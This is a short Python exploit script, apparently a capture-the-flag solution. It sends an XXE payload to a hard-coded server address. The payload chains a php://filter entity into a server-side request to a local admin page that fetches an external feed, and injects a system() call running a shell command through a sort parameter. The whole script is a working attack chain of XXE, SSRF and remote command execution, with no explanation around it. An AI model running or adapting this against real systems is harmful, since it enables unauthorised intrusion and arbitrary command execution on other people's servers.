import requests

payload = """
<!DOCTYPE name [ <!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost/admin?rss=http://jctf.tk:9999/index.txt&order=//">
]>
<name><name>&xxe;</name></name>
"""

command = "ls -lh /".replace(" ", "%20")
payload = """
<!DOCTYPE name [ <!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost/admin?rss=http://jctf.tk:9999/index.txt&order=id,1)%2bsystem('""" + command + """')%2bstrcmp(''">
]>
<name><name>&xxe;</name></name>
"""

r = requests.post("http://68.183.31.62:94/custom", data=payload)
#r = requests.post("http://127.0.0.1/", data=payload)
print(r.text)
